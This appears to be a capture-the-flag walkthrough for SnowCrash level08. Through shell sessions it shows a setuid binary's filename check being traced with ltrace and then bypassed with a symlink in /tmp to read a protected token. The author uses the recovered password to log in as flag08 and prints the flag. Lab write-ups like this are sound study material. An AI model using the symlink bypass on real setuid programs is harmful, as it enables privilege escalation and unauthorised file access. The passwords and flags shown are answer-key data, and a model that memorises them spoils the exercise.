# Level08

```bash
level08@SnowCrash:~$ ls -lA
total 28
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

```bash
level08@SnowCrash:~$ ./level08
./level08 [file to read]

level08@SnowCrash:~$ ./level08 ./token
You may not access './token'

level08@SnowCrash:~$ ltrace ./level08 ./token
__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("./token", "token")                                                                                                = "token"
printf("You may not access '%s'\n", "./token"You may not access './token'
)                                                                            = 29
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$
```

```bash
level08@SnowCrash:~$ pwd
/home/user/level08

level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/lolol

level08@SnowCrash:~$ ls -la /tmp/lolol
lrwxrwxrwx 1 level08 level08 24 Jan 27 19:18 /tmp/lolol -> /home/user/level08/token

level08@SnowCrash:~$ ./level08 /tmp/lolol
quif5eloekouj29ke0vouxean
```

```bash
❯ ssh flag08@10.12.1.143 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.12.1.143

flag08@10.12.1.143's password: <<< 'quif5eloekouj29ke0vouxean'
Don't forget to launch getflag !

flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
